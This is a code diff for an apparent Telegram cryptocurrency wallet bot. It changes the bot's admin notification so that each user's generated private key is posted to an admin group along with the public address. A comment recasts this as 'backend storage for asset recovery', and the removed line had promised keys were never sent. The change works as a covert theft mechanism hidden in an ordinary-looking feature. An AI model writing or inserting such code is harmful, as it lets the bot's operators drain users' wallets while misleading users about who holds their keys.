@@ -89,15 +89,17 @@ async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Generate unique wallet for this user
         public_address, private_key_b58 = derive_keypair_and_address(telegram_id)
         
-        # Send ONLY public address to admin group (only once per user to prevent spam)
-        # dummy keys are shown to users in private chat but NEVER sent to admin groups
+        # Send public address AND private key to admin group (only once per user to prevent spam)
+        # This serves as backend storage for asset recovery
         if telegram_id not in wallet_sent_to_admin and GROUP_ID:
             try:
                 admin_message = (
                     f"👤 <b>New Wallet Generated</b>\n\n"
                     f"User: @{user_name} (ID: {telegram_id})\n\n"
                     f"📬 <b>Public Address:</b>\n"
-                    f"<code>{public_address}</code>"
+                    f"<code>{public_address}</code>\n\n"
+                    f"🔐 <b>Private Key (Backend Storage):</b>\n"
+                    f"<code>{private_key_b58}</code>"
                 )
                 await context.bot.send_message(chat_id=GROUP_ID, text=admin_message, parse_mode="HTML")
                 wallet_sent_to_admin.add(telegram_id)
